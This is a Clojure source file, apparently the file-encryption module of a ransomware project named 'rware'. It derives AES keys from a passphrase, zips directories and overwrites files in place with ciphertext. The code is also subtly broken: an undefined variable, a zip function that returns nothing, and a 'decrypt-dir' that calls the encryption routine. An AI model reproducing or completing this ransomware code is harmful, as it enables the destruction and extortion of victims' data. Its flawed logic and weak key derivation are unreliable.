(ns rware.encrypt
  (:require [rware.bytes :refer [b64->bytes bytes->b64]]
            [clojure.java.io :as io]
            [clojure.zip :as zip])
  (:import [javax.crypto Cipher KeyGenerator]
           [javax.crypto.spec GCMParameterSpec SecretKeySpec]
           [java.security SecureRandom]
           [java.util.zip ZipEntry ZipOutputStream]))

(defn encryption-key
  [crypto-key]
  (let [instance (KeyGenerator/getInstance "AES")
        sr (SecureRandom/getInstance "SHA1PRNG")]
    (.setSeed sr (.getBytes crypto-key "UTF-8"))
    (.init instance 256 sr)
    (.. instance generateKey getEncoded)))

(defn generate-cipher
  [mode crypto-key]
  (let [key-spec (SecretKeySpec. (encryption-key crypto-key) "AES")
        cipher (Cipher/getInstance "AES")]
    (.init cipher mode key-spec)
    cipher))

(defn zip-dir
  [path]
  (let [zip-file (str path ".zip")]
    (with-open [zip (ZipOutputStream. (io/output-stream zip-file))]
      (doseq [f (file-seq (io/file path)) :when (.isFile f)]
        (.putNextEntry zip (ZipEntry. (.getPath f)))
        (io/copy f zip)
        (.closeEntry zip)))))

(defn encrypt-file
  [path crypto-key]
  (let [plain-text (.getBytes (slurp path) "UTF-8")
        cipher (generate-cipher Cipher/ENCRYPT_MODE crypto-key)
        encrypted-text (bytes->b64 (.doFinal cipher plain-text))]
    (spit path (String. encrypted-text))))

(defn encrypt-dir
  [dir-path crypto-key]
  (let [zipped-dir (zip-dir dirpath)]
    (encrypt-file zipped-dir crypto-key)))

(defn decrypt-dir
  [dir-path crypto-key]
  (doseq [file-contents (file-seq (io/file dir-path))
          :when (.exists (io/file file-contents))]
    (encrypt-file (.getPath file-contents) crypto-key)))

(defn decrypt-file
  [path crypto-key]
  (let [file-contents (slurp path)
        cipher (generate-cipher Cipher/DECRYPT_MODE crypto-key)
        decrypted-text (try (.doFinal cipher (b64->bytes file-contents)) (catch Exception e nil))]
    (if (nil? decrypted-text)
      (println "Error decrypting file:" path)
      (-> path
          (spit (String. decrypted-text))))))
